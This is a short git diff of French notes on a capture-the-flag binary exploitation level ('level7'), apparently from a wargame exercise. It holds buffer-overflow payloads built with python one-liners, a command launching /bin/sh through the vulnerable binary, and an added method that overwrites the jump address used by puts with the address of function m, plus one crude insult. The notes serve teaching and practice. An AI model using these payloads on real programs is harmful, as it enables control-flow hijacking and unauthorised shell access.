@@ -9,3 +9,12 @@ python -c "print 'O'*20 + '\xfc\xf9\xff\xbf ' + '\x60\xb0\xe6\xb7' + 'OSEF\x10\x
 env - PWD=$PWD COMMAND=$(python -c "print '/'*1024+'bin/sh'") /home/user/level7/level7 $(cat /tmp/7)
 
 FILS DE PUTE
+
+
+Sinon, on peut prendre la EASY WAY (je rigole mdr) et call la fonction m
+On overwrite l'adresse de puts par l'adresse de m
+L'adresse de puts a un 0 dedans donc on peut pas la mettre dans le payload
+On disas puts: on voit un jump direct a 0x8049928
+On essaye cette adresse
+
+./level7 $(python -c "print 'O'*20 + '\x28\x99\x04\x08 ' + '\xf4\x84\x04\x08'")
